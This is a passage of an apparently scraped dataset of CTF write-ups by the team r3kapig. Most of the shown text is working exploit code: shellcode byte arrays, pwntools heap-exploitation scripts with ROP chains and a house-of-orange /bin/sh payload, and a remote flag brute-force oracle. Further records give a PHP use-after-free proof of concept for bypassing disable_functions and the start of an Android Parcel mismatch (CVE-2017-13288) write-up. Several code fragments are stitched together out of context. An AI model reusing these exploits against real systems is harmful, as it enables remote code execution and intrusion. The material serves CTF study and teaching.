0x66,\n    0x85, 0xC0, 0x74, 0x1D, 0x0F, 0xB7, 0xC0, 0xFF, 0xC2, 0x6B, 0xC9, 0x21, 0x03, 0xC8, 0x8B, 0xC2,\n    0x0F, 0xB7, 0x04, 0x57, 0x66, 0x85, 0xC0, 0x75, 0xEB, 0x81, 0xF9, 0x55, 0x95, 0xDB, 0x6D, 0x74,\n    0x0E, 0x4D, 0x8B, 0x00, 0x49, 0x8B, 0x78, 0x60, 0x49, 0x3B, 0xF9, 0x75, 0xC3, 0xEB, 0x09, 0x49,\n    0x8B, 0x68, 0x30, 0x48, 0x85, 0xED, 0x75, 0x73, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00,\n    0x00, 0x48, 0x8B, 0x48, 0x18, 0x4C, 0x8B, 0x41, 0x10, 0x49, 0x8B, 0x78, 0x60, 0x4C, 0x8B, 0xCF,\n    0x48, 0x85, 0xFF, 0x74, 0x2B, 0x0F, 0xB7, 0x0F, 0x33, 0xD2, 0xB8, 0x05, 0x15, 0x00, 0x00, 0x66,\n    0x85, 0xC9, 0x74, 0x1C, 0x0F, 0xB7, 0xC9, 0xFF, 0xC2, 0x6B, 0xC0, 0x21, 0x03, 0xC1, 0x8B, 0xCA,\n    0x0F, 0xB7, 0x0C, 0x57, 0x66, 0x85, 0xC9, 0x75, 0xEB, 0x3D, 0x75, 0xEE, 0x40, 0x70, 0x74, 0x22,\n    0x4D, 0x8B, 0x00, 0x49, 0x8B, 0x78, 0x60, 0x49, 0x3B, 0xF9, 0x75, 0xC4, 0xB8, 0x01, 0x00, 0x00,\n    0x00, 0x48, 0x8B, 0xAC, 0x24, 0x70, 0x01, 0x00, 0x00, 0x48, 0x81, 0xC4, 0x50, 0x01, 0x00, 0x00,\n    0x5F, 0xC3, 0x49, 0x8B, 0x68, 0x30, 0x48, 0x85, 0xED, 0x74, 0xE1, 0x48, 0x89, 0x9C, 0x24, 0x68,\n    0x01, 0x00, 0x00, 0xBA, 0x97, 0x0F, 0x2C, 0x38, 0x48, 0x8B, 0xCD, 0x48, 0x89, 0xB4, 0x24, 0x48,\n    0x01, 0x00, 0x00, 0x4C, 0x89, 0xB4, 0x24, 0x40, 0x01, 0x00, 0x00, 0xE8, 0x60, 0x01, 0x00, 0x00,\n    0xBA, 0xFA, 0xC5, 0x96, 0xEB, 0x48, 0x8B, 0xCD, 0x48, 0x8B, 0xF8, 0xE8, 0x50, 0x01, 0x00, 0x00,\n    0xBA, 0x3C, 0x84, 0x78, 0xF1, 0x48, 0x8B, 0xCD, 0x48, 0x8B, 0xD8, 0xE8, 0x40, 0x01, 0x00, 0x00,\n    0xBA, 0x21, 0x99, 0x01, 0x71, 0x48, 0x8B, 0xCD, 0x4C, 0x8B, 0xF0, 0xE8, 0x30, 0x01, 0x00, 0x00,\n    0xBA, 0xB0, 0xEC, 0x3C, 0x66, 0x48, 0x8B, 0xCD, 0x48, 0x8B, 0xF0, 0xE8, 0x20, 0x01, 0x00, 0x00,\n    0xBA, 0x20, 0x00, 0x00, 0x00, 0x44, 0x8D, 0x4A, 0xE4, 0x33, 0xC9, 0x41, 0xB8, 0x00, 0x30, 0x00,\n    0x00, 0x48, 0x8B, 0xE8, 0xFF, 0xD7, 0xB9, 0x20, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xD0, 0x48, 0x8B,\n    0xF8, 0x33, 0xC0, 0xF3, 0xAA, 0x48, 0x89, 0x44, 0x24, 0x30, 0x45, 0x33, 0xC9, 0x49, 0x8B, 0xCA,\n    0x45, 0x33, 0xC0, 0xBA, 0x00, 0x00, 0x00, 0x80, 0xC7, 0x44, 0x24, 0x28, 0x80, 0x00, 0x00, 0x00,\n    0x41, 0xC7, 0x02, 0x43, 0x3A, 0x5C, 0x64, 0x41, 0xC7, 0x42, 0x04, 0x61, 0x64, 0x61, 0x64, 0x41,\n    0xC7, 0x42, 0x08, 0x62, 0x5C, 0x66, 0x6C, 0x41, 0xC7, 0x42, 0x0C, 0x61, 0x67, 0x2E, 0x74, 0x66,\n    0x41, 0xC7, 0x42, 0x10, 0x78, 0x74, 0xC7, 0x44, 0x24, 0x20, 0x03, 0x00, 0x00, 0x00, 0xFF, 0xD3,\n    0x4C, 0x8D, 0x8C, 0x24, 0x60, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x40, 0x41, 0xB8, 0x00,\n    0x01, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xFF,\n    0xD6, 0xB9, 0xF5, 0xFF, 0xFF, 0xFF, 0x41, 0xFF, 0xD6, 0x4C, 0x8D, 0x8C, 0x24, 0x60, 0x01, 0x00,\n    0x00, 0x48, 0x8D, 0x54, 0x24, 0x40, 0x41, 0xB8, 0x00, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0x48,\n    0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xD5, 0x4C, 0x8B, 0xB4, 0x24, 0x40, 0x01,\n    0x00, 0x00, 0x48, 0x8B, 0xB4, 0x24, 0x48, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x9C, 0x24, 0x68, 0x01,\n    0x00, 0x00, 0x48, 0x8B, 0xAC, 0x24, 0x70, 0x01, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x81, 0xC4, 0x50,\n    0x01, 0x00, 0x00, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,\n    0x0F, 0xB6, 0x11, 0x45, 0x33, 0xC0, 0xB8, 0x05, 0x15, 0x00, 0x00, 0x84, 0xD2, 0x74, 0x16, 0x90,\n    0x6B, 0xC0, 0x21, 0x0F, 0xBE, 0xD2, 0x45, 0x8D, 0x40, 0x01, 0x03, 0xC2, 0x41, 0x0F, 0xB6, 0x14,\n    0x08, 0x84, 0xD2, 0x75, 0xEB, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,\n    0x40, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x63, 0x41, 0x3C, 0x4C, 0x8B, 0xD9, 0x8B, 0xFA, 0x8B,\n    0x8C, 0x08, 0x88, 0x00, 0x00, 0x00, 0x85, 0xC9, 0x75, 0x08, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x20,\n    0x5F, 0xC3, 0x45, 0x8B, 0x54, 0x0B, 0x20, 0x49, 0x8D, 0x04, 0x0B, 0x48, 0x89, 0x5C, 0x24, 0x30,\n    0x8B, 0x58, 0x18, 0x48, 0x89, 0x6C, 0x24, 0x38, 0x8B, 0x68, 0x1C, 0x48, 0x89, 0x74, 0x24, 0x40,\n    0x8B, 0x70, 0x24, 0x4D, 0x03, 0xD3, 0x49, 0x03, 0xEB, 0x45, 0x33, 0xC9, 0x49, 0x03, 0xF3, 0x85,\n    0xDB, 0x74, 0x1B, 0x41, 0x8B, 0x0A, 0x49, 0x03, 0xCB, 0xE8, 0x72, 0xFF, 0xFF, 0xFF, 0x3B, 0xC7,\n    0x74, 0x23, 0x41, 0xFF, 0xC1, 0x49, 0x83, 0xC2, 0x04, 0x44, 0x3B, 0xCB, 0x72, 0xE5, 0x33, 0xC0,\n    0x48, 0x8B, 0x6C, 0x24, 0x38, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x8B, 0x74, 0x24, 0x40, 0x48,\n    0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x42, 0x0F, 0xB7, 0x0C, 0x4E, 0x8B, 0x44, 0x8D, 0x00, 0x49, 0x03,\n    0xC3, 0xEB, 0xDD\n]\nbuf = ''.join([chr(x) for x in buf])\npayload += buf\n\np.send(payload)\np.interactive()\n\nfrom pwn import *\n\nAES_BLOCK_SIZE = 16\ng_local=0\ncontext(log_level='debug', arch='amd64')\ne = ELF(\"./libc.so.6\")\nif g_local:\n    sh = process(\"./one_punch\", env={\"LD_LIBRARY_PATH\":\".\"})\n    gdb.attach(sh)\nelse:\n    sh = remote(\"52.198.120.1\", 48763)\n\ndef ce(cmd, idx, name):\n    sh.send(cmd + '\\x00')\n    sh.sendafter(\"idx: \", str(idx) + '\\x00')\n    sh.sendafter(\"name: \", name)\n    sh.recvuntil(\"> \")\n\ncreate = lambda idx,name: ce('1', idx, name)\nedit = lambda idx,name: ce('2', idx, name)\n\ndef show(idx):\n    sh.send('3\\x00')\n    sh.sendafter(\"idx: \", str(idx) + '\\x00')\n    sh.recvuntil(\"name: \")\n    ret = sh.recvuntil(\"\\n####\")[:-5]\n    sh.recvuntil(\"> \")\n    return ret\n\ndef delete(idx):\n    sh.send('4\\x00')\n    sh.sendafter(\"idx: \", str(idx) + '\\x00')\n    return sh.recvuntil(\"> \")\n\ndef punch(data=\"a\"):\n    sh.send(\"50056\".ljust(8, '\\x00'))\n    sh.send(data)\n    sh.recvuntil(\"> \")\n\ncreate(0, '0' * 0x217)\ncreate(1, '1' * 0x217)\n\ndelete(0)\ndelete(1)\n\nheap_addr = u64(show(1) + '\\x00\\x00') - 0x260\n\nfor i in xrange(5):\n    create(0, '2' * 0x217)\n    delete(0)\n\ncreate(0, '2' * 0x217)\ncreate(1, '3' * 0x217)\ndelete(0)\n\nlibc_addr = u64(show(0)+'\\x00\\x00') - 0x1e4ca0\nprint hex(heap_addr),hex(libc_addr)\ndelete(1)\n\npunch() # consume 1 tcache\ncreate(0, 'T' * 0x217)\ndelete(0)\nedit(0, p64(0)*2)\ndelete(0)\n# now top chunk + 0x10 == top elem in 0x220\n\nfor i in xrange(3):\n    create(i, 'U' * 0x217)\nfor i in xrange(3):\n    delete(i) # all merged to top\n\nfake_chunk = p64(0) + p64(0x211)\nfake_chunk += p64(heap_addr + 0x150 - 0x18)\nfake_chunk += p64(heap_addr + 0x150 - 0x10)\nfake_chunk = fake_chunk.ljust(0x210, 'F')\nfake_chunk += p64(0x210) + p64(0x600)\n\ncreate(0, cyclic(0x400))\nedit(0, fake_chunk)\n# 0x220 <- 0x200 top\n# +0x1e0 <- g[2].ptr\ncreate(2, cyclic(0x400))\n\n# current heap layout:\n# 0x400 chunk\n# [fake 0x210 chunk + 0x600 chunk head, whose next is top]\n# 0x400 chunk\n\ndelete(1) # unlink trigger, things merged to top\n\npunch(p64(0x28))\n# fake chunk_size for smallbin attack\n# otherwise calloc will crash in memset\n\ncreate(0, '7' * 0x217)\ndelete(0) # fill 0x220 tcache\n\n# consolidate topchunk\nfor i in xrange(6):\n    create(0, '4' * 0x1f0)\n    delete(0)\n\ncreate(1, 'P' * 0x217) # create a padding\ncreate(0, '4' * 0x1f0) # last tcache chunk\n\ndelete(0) # put it to tcache\nedit(0, p64(0) + p64(0))\n# rewrite fd and key to bypass double free check\n\ndelete(0) # to topchunk\ndelete(1) # to topchunk\n\n# now 0x200 -> 7, top element is behind topchunk\n# now 0x220 -> 7\n\ncreate(0, '5' * 0x220)\ncreate(0, '4' * 0x1f0) # chunk_head == top at 0x200\ncreate(1, '5' * 0x200)\n\ndelete(0)\ncreate(1, '5' * 0x200) # put to smallbin\n\nedit(0, p64(libc_addr+0x1e4e90) + p64(heap_addr+0x130))\ndelete(1)\nedit(1, p64(0)*2 + p64(heap_addr+0x130))\n\ncreate(0, 'C' * 0x1f0)\ncreate(0, 'A' * 0x10 + p64(libc_addr + \\\n    e.symbols[\"__malloc_hook\"]).ljust(0x1e0, '\\x00'))\n\n# add rsp,48; ret\npunch(p64(libc_addr + 0x8cfd6) + \"flag\\x00\")\n\npop_rdi = p64(libc_addr + 0x26542)\npop_rsi = p64(libc_addr + 0x26f9e)\npop_rdx = p64(libc_addr + 0x12bda6)\npop_rcx = p64(libc_addr + 0x10b31e)\n\nrop = pop_rdi + p64(2)\nrop += pop_rsi\nrop += p64(libc_addr + e.symbols[\"__malloc_hook\"] + 8)\nrop += pop_rdx + p64(0)\nrop += p64(libc_addr + e.symbols[\"syscall\"])\nrop += pop_rdi + p64(3)\nrop += pop_rsi + p64(heap_addr + 0x2000)\nrop += pop_rdx + p64(0x100)\nrop += p64(libc_addr + e.symbols[\"read\"])\nrop += pop_rdi + p64(1)\nrop += pop_rsi + p64(heap_addr + 0x2000)\nrop += pop_rdx + p64(0x100)\nrop += p64(libc_addr + e.symbols[\"write\"])\nrop += p64(0)\n\ncreate(0, rop)\n\nsh.interactive()\n\n\nNOP = 1\nADD = 2\nSUB = 3\nMUL = 4\nMOD = 5\nXOR = 6\nAND = 7\nLWR = 8\nEQU = 9\nJMP = 10\nJT = 11\nJF = 12\n# IMM = 13\nPOP = 14\n# GET = 15\n# SET = 16\nNEW = 17\nDEL = 18\nEDIT = 19\nSHOW = 20\n\n\ndef IMM(v):\n    assert v <= 10\n    return [13, -v]\n\ndef IMMX(v):\n    if v <= 10:\n        return IMM(v)\n    else:\n        hi, lo = divmod(v, 10)\n        pl = IMMX(hi) + IMM(10) + [MUL]\n        if lo != 0:\n            pl += IMM(lo) + [ADD]\n    return pl\n\ndef GET(idx, off):\n    return IMMX(off) + IMMX(idx) + [15]\n\ndef SET(idx, off):\n    return IMMX(off) + IMMX(idx) + [16]\n\ndef STR(idx, s):\n    pl = []\n    for i, c in enumerate(s):\n        pl += IMMX(ord(c)) + IMMX(i) + IMM(idx) + [16] # set\n    return pl\n\ndef GETI():\n    return GET(0, 0)\n\ndef GETJ():\n    return GET(0, 1)\n\ndef LOC(i):\n    return [i | (1 << 30)] * 14 # len(IMMX(999))\n\npl = IMMX(20) + [NEW] + IMMX(20) + [NEW]\npl += STR(1, '0 * 0 = 0\\n')\n\npl += IMM(1) + SET(0, 0) # i = 1\nloc3 = len(pl)\npl += IMM(10) + GETI() + [LWR] + LOC(1) + [JF]\n\npl += IMM(1) + SET(0, 1) # j = 1\nloc4 = len(pl)\npl += IMM(10) + GETJ() + [LWR] + LOC(2) + [JF]\n\npl += GETI() + IMMX(0x30) + [ADD] + SET(1, 0)\npl += GETJ() + IMMX(0x30) + [ADD] + SET(1, 4)\npl += GETI() + GETJ() + [MUL] + SET(0, 2)\n\npl += LOC(5) + IMM(10) + GET(0, 2) + [LWR] + LOC(5) + [JF]\n\npl += IMMX(10) + SET(1, 9) + IMM(0) + SET(1, 10)\npl += GET(0, 2) + IMMX(0x30) + [ADD] + SET(1, 8)\npl += IMM(1) + [SHOW]\npl += LOC(6) + [JMP]\n\nloc5 = len(pl)\npl += IMMX(10) + SET(1, 10) + IMM(0) + SET(1, 11)\npl += IMM(10) + GET(0, 2) + [MOD] + IMMX(0x30) + [ADD] + SET(1, 9) # lo\npl += IMM(10) + GET(0, 2) + [MOD] + GET(0, 2) + [SUB] + SET(0, 2)\npl += IMM(0) + SET(0, 3)\n\nloc7 = len(pl)\npl += IMM(10) + GET(0, 2) + [SUB] + SET(0, 2)\npl += IMM(1) + GET(0, 3) + [ADD] + SET(0, 3)\npl += LOC(7) + IMM(0) + GET(0, 2) + [EQU] + LOC(7) + [JF]\n\npl += GET(0, 3) + IMMX(0x30) + [ADD] + SET(1, 8) # hi\npl += IMM(1) + [SHOW]\n\nloc6 = len(pl)\npl += IMM(1) + GETJ() + [ADD] + SET(0, 1)\npl += LOC(4) + [JMP]\n\nloc2 = len(pl)\npl += IMM(1) + GETI() + [ADD] + SET(0, 0)\npl += LOC(3) + [JMP]\n\nloc1 = len(pl)\npl += [0x17]\n\nprint(len(pl))\ni = 0\nwhile i < len(pl):\n    v = pl[i]\n    if v == LOC(1)[0]:\n        r = loc1\n    elif v == LOC(2)[0]:\n        r = loc2\n    elif v == LOC(3)[0]:\n        r = loc3\n    elif v == LOC(4)[0]:\n        r = loc4\n    elif v == LOC(5)[0]:\n        r = loc5\n    elif v == LOC(6)[0]:\n        r = loc6\n    elif v == LOC(7)[0]:\n        r = loc7\n    else:\n        assert type(v) == int\n        i += 1\n        continue\n    a, t = divmod(r, 100)\n    b, c = divmod(t, 10)\n    t = IMM(a) + IMM(10) + [MUL] + IMM(b) + [ADD] + IMM(10) + [MUL] + IMM(c) + [ADD]\n    assert len(t) == 14\n    pl = pl[:i] + t + pl[i + 14:]\n    i += len(t)\nprint(pl)\n\nconsts = [128512,128513,128514,129315,128540,128516,128517,128518,128521,128522,128525,]\nopcodes = [0,127539,10133,10134,10060,0x2753,10062,128107,128128,128175,128640,127542,127514,9196,128285,128228,128229,127381,127379,128196,128221,128289,128290,0x1F6D1,]\n\nmp = {\n0x23EC: '\\xE2\\x8F\\xAC',\n0x274c: '\\xE2\\x9D\\x8C',\n0x274e: '\\xE2\\x9D\\x8E',\n0x2753: '\\xE2\\x9D\\x93',\n0x2795: '\\xE2\\x9E\\x95',\n0x2796: '\\xE2\\x9E\\x96',\n0x1F193: '\\xF0\\x9F\\x86\\x93',\n0x1F195: '\\xF0\\x9F\\x86\\x95',\n0x1F21A: '\\xF0\\x9F\\x88\\x9A',\n0x1F233: '\\xF0\\x9F\\x88\\xB3',\n0x1F236: '\\xF0\\x9F\\x88\\xB6',\n0x1f46b: '\\xF0\\x9F\\x91\\xAB',\n0x1f480: '\\xF0\\x9F\\x92\\x80',\n0x1f4af: '\\xF0\\x9F\\x92\\xAF',\n0x1f4c4: '\\xF0\\x9F\\x93\\x84',\n0x1f4dd: '\\xF0\\x9F\\x93\\x9D',\n0x1f4e4: '\\xF0\\x9F\\x93\\xA4',\n0x1f4e5: '\\xF0\\x9F\\x93\\xA5',\n0x1f51d: '\\xF0\\x9F\\x94\\x9D',\n0x1f521: '\\xF0\\x9F\\x94\\xA1',\n0x1f522: '\\xF0\\x9F\\x94\\xA2',\n0x1f600: '\\xF0\\x9F\\x98\\x80',\n0x1f601: '\\xF0\\x9F\\x98\\x81',\n0x1f602: '\\xF0\\x9F\\x98\\x82',\n0x1f604: '\\xF0\\x9F\\x98\\x84',\n0x1f605: '\\xF0\\x9F\\x98\\x85',\n0x1f606: '\\xF0\\x9F\\x98\\x86',\n0x1f609: '\\xF0\\x9F\\x98\\x89',\n0x1f60a: '\\xF0\\x9F\\x98\\x8A',\n0x1f60d: '\\xF0\\x9F\\x98\\x8D',\n0x1f61c: '\\xF0\\x9F\\x98\\x9C',\n0x1f680: '\\xF0\\x9F\\x9A\\x80',\n0x1f6d1: '\\xF0\\x9F\\x9B\\x91',\n0x1f923: '\\xF0\\x9F\\xA4\\xA3',\n}\n\n\nout = []\ni = 0\nwhile i < len(pl):\n    v = pl[i]\n    assert type(v) == int\n    if v <= 0:\n        t = abs(v)\n        assert t <= 10\n        out.append(mp[consts[t]])\n        i += 1\n    elif 0 < v and v < 0x18:\n        out.append(mp[opcodes[v]])\n        i += 1\n    else:\n        raise ValueError, v\n\nopen('payload', 'wb').write(''.join(out))\n\n#! /usr/bin/env python2\n# -*- coding: utf-8 -*-\n# vim:fenc=utf-8\n#\n# Copyright © 2018 anciety <anciety@anciety-pc>\n#\n# Distributed under terms of the MIT license.\nimport sys\nimport os\nimport os.path\nimport binascii\nimport string\n\nfrom pwn import *\ncontext(os='linux', arch='amd64', log_level='debug')\ncontext.terminal = ['ancyterm', '-s', '192.168.142.1', '-t', 'alacritty', '-e']\n\n# synonyms for faster typing\ntube.s = tube.send\ntube.sl = tube.sendline\ntube.sa = tube.sendafter\ntube.sla = tube.sendlineafter\ntube.r = tube.recv\ntube.ru = tube.recvuntil\ntube.rl = tube.recvline\ntube.rr = tube.recvregex\ntube.irt = tube.interactive\n\nif len(sys.argv) > 2:\n    DEBUG = 0\n    HOST = sys.argv[1]\n    PORT = int(sys.argv[2])\n\n    p = remote(HOST, PORT)\nelse:\n    DEBUG = 1\n    if len(sys.argv) == 2:\n        PATH = sys.argv[1].split()\n\n    p = process(PATH)\n\n\n# by w1tcher who dominates pwnable challenges\ndef house_of_orange(head_addr, system_addr, io_list_all):\n    payload = b'/bin/sh\\x00'\n    payload = payload + p64(0x61) + p64(0) + p64(io_list_all - 16)\n    payload = payload + p64(0) + p64(1) + p64(0) * 9 + p64(system_addr) + p64(0) * 4\n    payload = payload + p64(head_addr + 18 * 8) + p64(2) + p64(3) + p64(0) + \\\n            p64(0xffffffffffffffff) + p64(0) * 2 + p64(head_addr + 12 * 8)\n    return payload\n\n\norig_attach = gdb.attach\ndef gdb_attach(*args, **kwargs):\n    if DEBUG:\n        orig_attach(*args, **kwargs)\ngdb.attach = gdb_attach\n\n\ndef choose(p, n):\n    p.ru('quit\\n')\n    p.sl(str(n))\n\n\ndef write(p, s):\n    choose(p, 1)\n    p.ru('format)\\n')\n    p.sl(binascii.hexlify(s))\n    \n\ndef read(p):\n    choose(p, 2)\n    return p.rl().strip()\n\n\ndef check(p, s):\n    flag_sha1 = read(p)\n    with open('temp', 'wb') as f:\n        f.write(s)\n    cmd = './getsha1.sh'.split()\n    with process(cmd) as x:\n        sha1 = x.rl().strip()\n    if sha1 == flag_sha1:\n        return True\n    else:\n        return False\n\ndef flag_len_le(p, n):\n    p.info('checking length {}'.format(n))\n    choose(p, 1337)\n    s = 'a' * n\n    write(p, s)\n    if check(p, s):\n        p.info('True')\n        return True\n    else:\n        p.info('False')\n        return False\n\ndef guess_length(p, l, r):\n    p.info('l {} r {}'.format(l, r))\n    if l == r:\n        return l\n    mid = (l + r) >> 1\n    if flag_len_le(p, mid):\n        r = mid\n        return guess_length(p, l, r)\n    else:\n        l = mid + 1\n        return guess_length(p, l, r)\n\nflag_postfix = ''\ndef guess_byte(p, b, idx):\n    global flag_postfix\n    p.info('guessing #{} with {}'.format(idx, b))\n    prepend_n = max(idx - 1, 0)\n    guessing_flag = prepend_n * 'a' + b + flag_postfix\n    p.info('testing {}'.format(guessing_flag))\n    choose(p, 1337)\n    if prepend_n > 0:\n        write(p, 'a' * prepend_n)\n    confirmed = check(p, guessing_flag)\n    if confirmed:\n        p.info('success, flag postfix {}'.format(flag_postfix))\n        flag_postfix = b + flag_postfix\n        return True\n    else:\n        p.info('failed')\n        return False\n\ndef main():\n    global flag_postfix\n    #length = guess_length(0, 0x40) # 32\n    length = 32\n    \n    for i in range(length, 0, -1):\n        guessed = False\n        for x in string.printable:\n            #with process('ruby hexdump.rb'.split()) as p:\n            with remote(HOST, PORT) as p:\n                if guess_byte(p, x, i):\n                    guessed = True\n                    break\n        if not guessed:\n            raise Exception('not found for #{}'.format(i))\n\n    p.info('flag {}'.format(flag_postfix))\n\n    p.irt()\n\nif __name__ == '__main__':\n    main()\n\n\n\n    import numpy as np\n\n\n    if left<0:\n        return True\n    r = len(box) - 1\n    while(r!=left):\n        # print(left, r)\n        if box[left]<box[r]:\n            box[left], box[r] = box[r], box[left]\n            # fuck\n            reverse(box, left+1)\n            return True\n        r -= 1\n    return False\n\n\n    cur_cipher = buf\n    for i in range(16):\n        key = keys[i]\n        print(key)\n        cur_cipher = byte_xorer(cur_cipher, key)\n        cur_cipher = cur_cipher[::-1]\n    return cur_cipher\n\n\n    keys = keygen()\n    res = decrypt(keys, buf)\n    print (res)\n\n\n    def wrapped_cmd(*args, **kwargs):\n        p.ru('>>> ')\n        f(*args, **kwargs)\n    return wrapped_cmd\n\n\n    print(len(rop))\n    assert len(rop) <= 0xf0\n\n\n    for i in range(length, 0, -1):\n        guessed = False\n        for x in string.printable:\n            #with process('ruby hexdump.rb'.split()) as p:\n            with remote(HOST, PORT) as p:\n                if guess_byte(p, x, i):\n                    guessed = True\n                    break\n        if not guessed:\n            raise Exception('not found for #{}'.format(i))\n", "tools": ["python", "gdb"], "file_path": "temp_repos\\r3kapig_writeup\\20191018-hitcon-quals\\README.md", "file_size": 52824, "scraped_at": "2025-10-26T18:19:25.825361"}
{"id": "r3kapig_writeup_0x00_Overview", "team": "r3kapig", "repo": "writeup", "challenge_name": "0x00 Overview", "attack_type": "Pwn", "writeup": "---\nlayout: post\ntitle:  \"Easy PHP UAF\"\ndate:   2020-05-04 00:00:00 +0000\ncategories: jekyll update\n---\n\nCloned from [Our member 2019's post](https://mem2019.github.io/jekyll/update/2020/05/04/Easy-PHP-UAF.html).\n\n## 0x00 Overview\n\nAlthough I failed to solve the challenge during CTF, but I think it is worthwhile to do a write-up.\n\nThe challenge is to exploit a PHP script engine using [this bug](https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php). We can execute arbitrary PHP code but we must bypass `disabled_function` restriction to execute shell command, using a UAF vulnerability. Therefore, this is actually more a Pwn challenge than a Web challenge.\n\nHowever, different from official PHP engine, a custom `libphp7.so` is provided. This engine does not provide any loop functionality such as `for/while/do-while/foreach`. Moreover, in remote server, the recursion depth is also restricted, and `strlen` function always returns `NULL`, even though these cases do not occur in my local environment.\n\nThe exploit idea is similar to the exploit provided in Github: use UAF to overlap a string with an object, so that we can leak the addresses, then clone a function object and rewrite relevant function pointer to make the function `system`.\n\n## 0x01 Environment\n\nFirstly, we pull and run the docker provided by challenge:\n\n```bash\nsudo docker pull php:7.4.2-apache\nsudo docker run -i -t php:7.4.2-apache /bin/bash\n```\n\nThen, start the apache server:\n\n```bash\n# -------- commands in host shell --------\nsudo docker cp libphp7.so [hex id shown in bash shell]:/usr/lib/apache2/modules/libphp7.so\n# replace the libphp7 to provided libphp7\nsudo docker cp exp.php [hex id shown in bash shell]:/var/www/html/index.php\n# copy the exploit into docker\n\n# -------- commands in docker shell --------\nexport APACHE_RUN_USER=www-data\nexport APACHE_RUN_GROUP=www-data\n# set some necessary environment variable\napache2ctl -X\n# start apache server\n```\n\nTo debug the apache server, what I did is just use `gdb` outside docker and attach to the `apache2ctl` process. The functionality is pretty rudimentary, but it is okay if you just want to inspect memory status at crash.\n\n## 0x02 Bug\n\n*In my understanding*, The use-after-free is caused by freeing variables without reference(e.i. `ref count = 0`) before putting the local variables into the `backtrace`. In this way already freed variables can be re-accessed by accessing `backtrace`. As the [patch](http://git.php.net/?p=php-src.git;a=commitdiff;h=ef1e4891b47949c8dc0f9482eef9454a0ecdfa1d;hp=8226e704e4e6066a5bd41b57b2934a3371896be2) suggests, the way to fix is just to put stack frame unlink before freeing variables:\n\n>Unlink the current stack frame before freeing CVs or extra args.\n>This means it will no longer show up in back traces that are\n>generated during CV destruction.\n>\n>We already did this prior to destructing the object/closure,\n>presumably for the same reason.\n\nThe PoC with explanation is shown below:\n\n```php\nclass Vuln {\n    public $a;\n    public function __destruct() {\n        global $backtrace;\n        unset($this->a);\n        $backtrace = (new Exception)->getTrace(); // backtrace has ref to $arg\n    }\n}\nfunction trigger_uaf($arg) {\n    $arg = str_shuffle(str_repeat('A', 79)); // string to be UAFed\n    $vuln = new Vuln();\n    $vuln->a = $arg;\n}\ntrigger_uaf('x');\n$backtrace[0]['args'][1] // access UAF string\n```\n\n## 0x03 Exploit\n\n### PHP Object Memory Layout\n\nBefore exploiting any script engine, one critical thing to know is how object is stored in this script engine. In this case, we need to know how `string` and other PHP objects are stored in memory, since the best way to exploit UAF is to replace the just freed string with another PHP object to have type confusion. In this way we may do some evil stuff such as leaking critical memory addresses by reading from that PHP string.\n\nThanks to @Anciety who helped me to find [definition of various PHP types](https://github.com/php/php-src/blob/master/Zend/zend_types.h), I can investigate the exploitation more conveniently.\n\nThe exploit method that the provided exploit is using is to obfuscate PHP string with PHP object created from class. Here are definitions of these 2 types:\n\n```c\nstruct _zend_string {\n    zend_refcounted_h gc;\n    zend_ulong        h;                /* hash value */\n    size_t            len;\n    char              val[1];\n};\nstruct _zend_object {\n    zend_refcounted_h gc;\n    uint32_t          handle; // TODO: may be removed ???\n    zend_class_entry *ce;\n    const zend_object_handlers *handlers;\n    HashTable        *properties;\n    zval              properties_table[1]; \n    // zval is a union followed by its type description\n    // for example: string is _zend_string* pointer and 0x6\n};\n```\n\nThe overlap is shown below:\n\n```\nstring      object\ngc          gc\nh           handle\nlen         ce\nval+0       handlers\nval+8       properties\nval+16      first field\nval+24      type of first field\n       ...\n", "solution_code": "", "tools": ["gdb", "radare2"], "file_path": "temp_repos\\r3kapig_writeup\\20200504-Easy-PHP-UAF\\README.md", "file_size": 9954, "scraped_at": "2025-10-26T18:19:25.861782"}
{"id": "r3kapig_writeup_BroadcastTest", "team": "r3kapig", "repo": "writeup", "challenge_name": "BroadcastTest", "attack_type": "Misc", "writeup": "# BroadcastTest\n\n## Writeup\n\n### background\nWe reverse the apk and find out that we only have 4 classes: `MainActivity$Message`, `Receiver`1-3. and `MainActivity$Message` implement from Parcelable class.\n\n`Receiver1` is exported. It receive global broadcast and send the bundle to `Receiver2`.\n\n`Receiver2` and `Recevier3` isn't exported, so they can only receive broadcasts from this apk.\n\nThe procedure is \n\n1. `Receiver1` receive the data from broadcast, and decode it by base64, then marshall it to a bundle, and send it as a broadcast to `Receiver2`.\n2. `Receiver2` check the \"command\", assert value != 'getflag', then send it to `Receiver3`.\n3. `Receiver3` check the \"command\", assert value == 'getflag.\n\nI search the parcel and bundle then find [this article](https://www.ms509.com/2018/07/03/bundle-mismatch) and CVE-2017-13288.\n\n### theory\nAndroid can marshal an object by implementing from Parceable.\nThe class must implement `writeToParcel` and `readFromParcel` method to describe how to marshal and unmarshal.\nParcelable object needs to be taken by Bundle, which is a hashmap.\nBundle can be put key-value by `PutExtra(key, value)`. The type of value can be int, Boolean, String or Parcelable object etc. \n\n``` Java\n// Keep in sync with frameworks/native/include/private/binder/ParcelValTypes.h.\n    private static final int VAL_NULL = -1;\n    private static final int VAL_STRING = 0;\n    private static final int VAL_INTEGER = 1;\n    private static final int VAL_MAP = 2;\n    private static final int VAL_BUNDLE = 3;\n    private static final int VAL_PARCELABLE = 4;\n    private static final int VAL_SHORT = 5;\n    private static final int VAL_LONG = 6;\n    private static final int VAL_FLOAT = 7;\n```\n\nIt will write len of total, magic number, and key-value pairs. \nFrom 